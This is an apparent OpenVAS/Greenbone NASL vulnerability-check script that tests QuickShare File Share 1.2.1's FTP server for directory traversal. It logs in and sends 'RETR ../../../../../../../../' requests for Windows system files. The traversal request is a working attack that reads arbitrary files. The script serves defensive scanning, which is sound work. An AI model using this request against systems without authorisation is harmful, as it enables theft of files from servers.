if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800197" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "QuickShare File Share FTP Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/quickshare/file_share/detected", "Host/runs_windows" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16105/" );
	script_xref( name: "URL", value: "http://securityreason.com/exploitalert/9927" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98137/quicksharefs-traverse.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary
  files on the affected application." );
	script_tag( name: "affected", value: "QuickShare File Share 1.2.1." );
	script_tag( name: "insight", value: "The flaw is due to an error while handling certain requests
  containing 'dot dot' sequences (..) and back slashes in URL, which can be exploited to download
  arbitrary files from the host system via directory traversal attack." );
	script_tag( name: "solution", value: "Upgrade to QuickShare File Share version 1.2.2 or later." );
	script_tag( name: "summary", value: "The host is running QuickShare File Share FTP Server and is
  prone to directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( tolower( banner ), "220 quickshare ftpd" )){
	exit( 0 );
}
soc1 = open_sock_tcp( port );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if(!login_details){
	ftp_close( socket: soc1 );
	exit( 0 );
}
port2 = ftp_get_pasv_port( socket: soc1 );
if(!port2){
	ftp_close( socket: soc1 );
	exit( 0 );
}
soc2 = open_sock_tcp( port: port2, transport: get_port_transport( port ) );
if(!soc2){
	ftp_close( socket: soc1 );
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	req = "RETR ../../../../../../../../" + file;
	send( socket: soc1, data: NASLString( req, "\\r\\n" ) );
	res = ftp_recv_data( socket: soc2 );
	if(res && match = egrep( string: res, pattern: pattern, icase: TRUE )){
		ftp_close( socket: soc1 );
		close( soc2 );
		report = "Used request:  " + req + "\n";
		report += "Received data: " + match;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
ftp_close( socket: soc1 );
close( soc2 );
exit( 0 );

